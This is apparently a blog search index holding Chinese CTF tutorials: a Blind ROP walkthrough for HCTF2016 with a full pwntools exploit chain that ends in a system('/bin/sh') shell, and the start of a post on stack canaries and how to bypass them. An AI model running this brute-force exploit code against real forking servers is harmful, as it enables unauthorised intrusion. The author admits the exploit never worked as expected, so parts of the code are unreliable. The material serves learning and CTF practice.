<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BROP(Blind ROP)</title>
    <url>/2019/07/28/BROP/</url>
    <content><![CDATA[<h1 id="brop">BROP</h1>
<h2 id="原理">原理</h2>
<p>BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下，通过 ROP 进行远程攻击，劫持该应用程序的控制流</p>
<h2 id="攻击条件">攻击条件</h2>
<ol type="1">
<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
</ol>
<h2 id="基本思路">基本思路</h2>
<ol type="1">
<li>通过暴力枚举判断栈的长度</li>
<li>有Canary的话，爆破Canary</li>
<li>寻找<code>stop_gadget</code>，所谓<code>stop gadget</code>一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。</li>
<li>获取<code>brop_gadget</code>，通过构造栈的布局来寻找可用的gadget。</li>
<li>寻找<code>puts@plt</code></li>
<li>寻找<code>puts@got</code></li>
<li>构造payload</li>
</ol>
<h2 id="例题hctf2016-出题人失踪了">例题：HCTF2016 出题人失踪了</h2>
<h3 id="获取stack-size">获取stack size</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_buffer_size</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        payload  = <span class="string">"A"</span></span><br><span class="line">        payload += <span class="string">"A"</span>*i</span><br><span class="line">        buf_size = len(payload) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"bad: %d"</span> % buf_size)</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"buffer size: %d"</span> % buf_size)</span><br><span class="line">            <span class="keyword">return</span> buf_size</span><br></pre></td></tr></table></figure>
<p>计算出<code>[*] buffer size:72</code></p>
<h3 id="获取stop-gadget">获取stop gadget</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(buf_size)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"stop address: 0x%x"</span> % addr)</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"bad: 0x%x"</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">"Can't connect"</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>得到<code>[*] stop gadget:4005e5</code></p>
<h3 id="获取common-gadget">获取common gadget</h3>
<p>找到一些能控制输出函数参数的gadgets，例如<code>pop rdi; retn</code>之类的，因为程序是64位，所以可以来找通用gadget。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gadgets_addr</span><span class="params">(buf_size, stop_addr)</span>:</span></span><br><span class="line">    addr = stop_addr</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        payload += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">4</span>) + p64(<span class="number">5</span>) + p64(<span class="number">6</span>)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"find address: 0x%x"</span> % addr)</span><br><span class="line">            <span class="keyword">try</span>:    <span class="comment"># check</span></span><br><span class="line">                payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">                payload += p64(addr)</span><br><span class="line">                payload += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">4</span>) + p64(<span class="number">5</span>) + p64(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">                p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">                p.recvline()</span><br><span class="line">                p.sendline(payload)</span><br><span class="line">                p.recvline()</span><br><span class="line">                p.close()</span><br><span class="line">                log.info(<span class="string">"bad address: 0x%x"</span> % addr)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                p.close()</span><br><span class="line">                log.info(<span class="string">"gadget address: 0x%x"</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"bad: 0x%x"</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">"Can't connect"</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>得到通用gadget后，gadget address+9即是<code>pop rdi; retn</code>的地址。</p>
<h3 id="获取putsplt地址">获取puts@plt地址</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_plt</span><span class="params">(buf_size, stop_addr, gadgets_addr)</span>:</span></span><br><span class="line">    pop_rdi = gadgets_addr + <span class="number">9</span>      <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    addr = stop_addr</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">        payload += p64(pop_rdi)</span><br><span class="line">        payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            <span class="keyword">if</span> p.recv().startswith(<span class="string">"\x7fELF"</span>):</span><br><span class="line">                log.info(<span class="string">"puts@plt address: 0x%x"</span> % addr)</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            log.info(<span class="string">"bad: 0x%x"</span> % addr)</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"bad: 0x%x"</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">"Can't connect"</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="dump文件">dump文件</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_memory</span><span class="params">(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)</span>:</span></span><br><span class="line">    pop_rdi  = gadgets_addr + <span class="number">9</span>     <span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> start_addr &lt; end_addr:</span><br><span class="line">        <span class="comment">#print result.encode('hex')</span></span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">        payload += p64(pop_rdi)</span><br><span class="line">        payload += p64(start_addr)</span><br><span class="line">        payload += p64(puts_plt)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recv(timeout=<span class="number">0.1</span>)      <span class="comment"># timeout makes sure to recive all bytes</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">"\n"</span>:</span><br><span class="line">                data = <span class="string">"\x00"</span></span><br><span class="line">            <span class="keyword">elif</span> data[<span class="number">-1</span>] == <span class="string">"\n"</span>:</span><br><span class="line">                data = data[:<span class="number">-1</span>]</span><br><span class="line">            log.info(<span class="string">"leaking: 0x%x --&gt; %s"</span> % (start_addr,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">            result += data</span><br><span class="line">            start_addr += len(data)</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">"Can't connect"</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h3 id="获取putsgot地址">获取puts@got地址</h3>
<p>dump下来文件后，使用radare2打开进行分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[0x00400630]&gt; pd 14 @ 0x4005e7</span><br><span class="line">     ::::   0x004005e7      25240a2000     and eax, 0x200a24</span><br><span class="line">     ::::   0x004005ec      0f1f4000       nop dword [rax]</span><br><span class="line">     ::::   0x004005f0      ff25220a2000   jmp qword [0x00601018]      ; [0x601018:8]&#x3D;-1</span><br><span class="line">     ::::   0x004005f6      6800000000     push 0</span><br><span class="line">     &#96;&#x3D;&#x3D;&#x3D;&#x3D;&lt; 0x004005fb      e9e0ffffff     jmp 0x4005e0</span><br><span class="line">      :::   0x00400600      ff251a0a2000   jmp qword [0x00601020]      ; [0x601020:8]&#x3D;-1</span><br><span class="line">      :::   0x00400606      6801000000     push 1                      ; 1</span><br><span class="line">      &#96;&#x3D;&#x3D;&#x3D;&lt; 0x0040060b      e9d0ffffff     jmp 0x4005e0</span><br><span class="line">       ::   0x00400610      ff25120a2000   jmp qword [0x00601028]      ; [0x601028:8]&#x3D;-1</span><br><span class="line">       ::   0x00400616      6802000000     push 2                      ; 2</span><br><span class="line">       &#96;&#x3D;&#x3D;&lt; 0x0040061b      e9c0ffffff     jmp 0x4005e0</span><br><span class="line">        :   0x00400620      ff250a0a2000   jmp qword [0x00601030]      ; [0x601030:8]&#x3D;-1</span><br><span class="line">        :   0x00400626      6803000000     push 3                      ; 3</span><br><span class="line">        &#96;&#x3D;&lt; 0x0040062b      e9b0ffffff     jmp 0x4005e0</span><br></pre></td></tr></table></figure>
<h3 id="exploit">exploit</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_buffer_size</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        payload  = <span class="string">"A"</span></span><br><span class="line">        payload += <span class="string">"A"</span>*i</span><br><span class="line">        buf_size = len(payload) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"bad: %d"</span> % buf_size)</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"buffer size: %d"</span> % buf_size)</span><br><span class="line">            <span class="keyword">return</span> buf_size</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span><span class="params">(buf_size)</span>:</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"stop address: 0x%x"</span> % addr)</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"bad: 0x%x"</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">"Can't connect"</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gadgets_addr</span><span class="params">(buf_size, stop_addr)</span>:</span></span><br><span class="line">    addr = stop_addr</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        payload += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">4</span>) + p64(<span class="number">5</span>) + p64(<span class="number">6</span>)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"find address: 0x%x"</span> % addr)</span><br><span class="line">            <span class="keyword">try</span>:    <span class="comment"># check</span></span><br><span class="line">                payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">                payload += p64(addr)</span><br><span class="line">                payload += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">4</span>) + p64(<span class="number">5</span>) + p64(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">                p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">                p.recvline()</span><br><span class="line">                p.sendline(payload)</span><br><span class="line">                p.recvline()</span><br><span class="line">                p.close()</span><br><span class="line">                log.info(<span class="string">"bad address: 0x%x"</span> % addr)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                p.close()</span><br><span class="line">                log.info(<span class="string">"gadget address: 0x%x"</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"bad: 0x%x"</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">"Can't connect"</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_plt</span><span class="params">(buf_size, stop_addr, gadgets_addr)</span>:</span></span><br><span class="line">    pop_rdi = gadgets_addr + <span class="number">9</span>      <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    addr = stop_addr</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">        payload += p64(pop_rdi)</span><br><span class="line">        payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            <span class="keyword">if</span> p.recv().startswith(<span class="string">"\x7fELF"</span>):</span><br><span class="line">                log.info(<span class="string">"puts@plt address: 0x%x"</span> % addr)</span><br><span class="line">                p.close()</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            log.info(<span class="string">"bad: 0x%x"</span> % addr)</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            log.info(<span class="string">"bad: 0x%x"</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">"Can't connect"</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_memory</span><span class="params">(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)</span>:</span></span><br><span class="line">    pop_rdi  = gadgets_addr + <span class="number">9</span>     <span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> start_addr &lt; end_addr:</span><br><span class="line">        <span class="comment">#print result.encode('hex')</span></span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">        payload += p64(pop_rdi)</span><br><span class="line">        payload += p64(start_addr)</span><br><span class="line">        payload += p64(puts_plt)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">            p.recvline()</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recv(timeout=<span class="number">0.1</span>)      <span class="comment"># timeout makes sure to recive all bytes</span></span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">"\n"</span>:</span><br><span class="line">                data = <span class="string">"\x00"</span></span><br><span class="line">            <span class="keyword">elif</span> data[<span class="number">-1</span>] == <span class="string">"\n"</span>:</span><br><span class="line">                data = data[:<span class="number">-1</span>]</span><br><span class="line">            log.info(<span class="string">"leaking: 0x%x --&gt; %s"</span> % (start_addr,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">            result += data</span><br><span class="line">            start_addr += len(data)</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">"Can't connect"</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span><span class="params">(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got)</span>:</span></span><br><span class="line">    pop_rdi  = gadgets_addr + <span class="number">9</span></span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(puts_got)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(stop_addr)</span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    data = u64(data[:<span class="number">-1</span>] + <span class="string">'\x00\x00'</span>)</span><br><span class="line">    log.info(<span class="string">"puts address: 0x%x"</span> % data)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#buf_size = get_buffer_size()</span></span><br><span class="line">buf_size = <span class="number">72</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stop_addr = get_stop_addr(buf_size)</span></span><br><span class="line">stop_addr = <span class="number">0x4005e5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadgets_addr = get_gadgets_addr(buf_size, stop_addr)</span></span><br><span class="line">gadgets_addr = <span class="number">0x40082a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#puts_plt = get_puts_plt(buf_size, stop_addr, gadgets_addr)</span></span><br><span class="line">puts_plt = <span class="number">0x4005e7</span>     <span class="comment"># fake puts</span></span><br><span class="line"><span class="comment">#puts_plt = 0x4005f0    # true puts</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dump code section from memory</span></span><br><span class="line"><span class="comment"># and then use Radare2 or IDA Pro to find the got address</span></span><br><span class="line"><span class="comment">#start_addr = 0x400000</span></span><br><span class="line"><span class="comment">#end_addr   = 0x401000</span></span><br><span class="line"><span class="comment">#code_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)</span></span><br><span class="line"><span class="comment">#with open('code.bin', 'wb') as f:</span></span><br><span class="line"><span class="comment">#   f.write(code_bin)</span></span><br><span class="line"><span class="comment">#   f.close()</span></span><br><span class="line">puts_got = <span class="number">0x00601018</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># you can also dump data from memory and get information from .got</span></span><br><span class="line"><span class="comment">#start_addr = 0x600000</span></span><br><span class="line"><span class="comment">#end_addr   = 0x602000</span></span><br><span class="line"><span class="comment">#data_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)</span></span><br><span class="line"><span class="comment">#with open('data.bin', 'wb') as f:</span></span><br><span class="line"><span class="comment">#    f.write(data_bin)</span></span><br><span class="line"><span class="comment">#    f.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># must close ASLR</span></span><br><span class="line"><span class="comment">#puts_addr = get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got)</span></span><br><span class="line">puts_addr = <span class="number">0x7ffff7a90210</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># first add your own libc into libc-database: $ ./add /usr/lib/libc-2.26.so</span></span><br><span class="line"><span class="comment"># $ ./find puts 0x7ffff7a90210</span></span><br><span class="line"><span class="comment"># or $ ./find puts 210</span></span><br><span class="line"><span class="comment"># $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570</span></span><br><span class="line"><span class="comment"># $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts</span></span><br><span class="line"><span class="comment"># then you can get the following offset</span></span><br><span class="line">offset_puts   = <span class="number">0x000000000006f210</span></span><br><span class="line">offset_system = <span class="number">0x0000000000042010</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x17aff5</span></span><br><span class="line"></span><br><span class="line">system_addr = (puts_addr - offset_puts) + offset_system</span><br><span class="line">binsh_addr  = (puts_addr - offset_puts) + offset_str_bin_sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">payload  = <span class="string">"A"</span>*buf_size</span><br><span class="line">payload += p64(gadgets_addr + <span class="number">9</span>)    <span class="comment"># pop rdi; ret;</span></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(stop_addr)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">10001</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2>
<p>思路是这么个思路，但是不管怎么做，怎么改payload，就是达不到预期效果，甚至光网上的wp不同的stop gadget和common gadget都有三种，可能还是系统版本问题。</p>
]]></content>
  </entry>
  <entry>
    <title>Canary原理以及绕过</title>
    <url>/2019/05/31/canary/</url>
    <content><![CDATA[<h1 id="canary原理以及绕过">Canary原理以及绕过</h1>
<p><code>Canary</code>是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志<code>Canary</code>，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。</p>
<h2 id="canary实现原理">Canary实现原理</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | Canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
<p>函数在<code>fs:[0x28]</code>取一个值，放入栈中，在函数结束前与<code>fs:[0x28]</code>进行异或，如果结果为0，<code>Canary</code>则未修改，不为0就是发生了缓冲区溢出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;异或检查Canary</span><br><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
<p>而fs寄存器又指向了当前栈的TLS结构(TLS全称线程局部存储器，它用来保存变量或回调函数)，<code>fs:[0x28]</code>则指向了<code>stack_guard</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        &#x2F;* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  *&#x2F;</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       &#x2F;* Pointer to the thread descriptor.  *&#x2F;</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
<p>如果可以溢出覆盖tls的话，就可以绕过<code>Canary</code></p>
<p>如果<code>Canary</code>已被修改，程序会走到 <code>__stack_chk_fail</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//eglibc-2.19/debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="canary绕过">Canary绕过</h2>
<h3 id="泄露canary">泄露Canary</h3>
<p>漏洞代码：</p>
